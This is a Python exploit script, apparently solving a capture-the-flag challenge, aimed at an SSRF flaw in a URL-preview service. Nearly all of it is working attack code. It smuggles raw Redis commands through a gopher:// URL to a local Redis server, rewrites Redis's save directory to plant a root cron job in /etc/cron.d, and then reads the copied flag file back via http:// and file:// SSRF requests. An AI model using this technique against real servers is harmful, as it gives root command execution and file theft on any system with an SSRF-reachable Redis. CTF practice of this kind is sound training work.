import urllib.request
import urllib.parse
import re
import sys
import time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=10):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode('utf-8', errors='replace')
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:2000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER: len=' + str(len(html))
    except Exception as e:
        return f'EXCEPTION: {e}'

# Use Redis (runs as root) to write a cron job that copies flag
cron_payload = '\n\n* * * * * root cp /root/flag.txt /var/www/html/flag_out.txt && chmod 644 /var/www/html/flag_out.txt\n\n'
cron_len = len(cron_payload)

resp_cmds = ""
resp_cmds += "*1\r\n$8\r\nFLUSHALL\r\n"
resp_cmds += "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$10\r\n/etc/cron.d\r\n"
resp_cmds += "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$5\r\npwned\r\n"
resp_cmds += f"*3\r\n$3\r\nSET\r\n$4\r\ncron\r\n${cron_len}\r\n{cron_payload}\r\n"
resp_cmds += "*1\r\n$4\r\nSAVE\r\n"
resp_cmds += "*1\r\n$4\r\nQUIT\r\n"

encoded = urllib.parse.quote(resp_cmds)
gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"

print("=== Writing cron job via Redis ===")
result = fetch(gopher_url, timeout=10)
print(result)
print()

# Wait for cron to execute
print("Waiting 65 seconds for cron to execute...")
time.sleep(65)

# Try to read the flag
print("=== Reading flag via SSRF ===")
print(fetch('http://127.0.0.1/flag_out.txt'))
print()

# Also try via file://
print("=== Reading flag via file:// ===")
print(fetch('file:///var/www/html/flag_out.txt'))
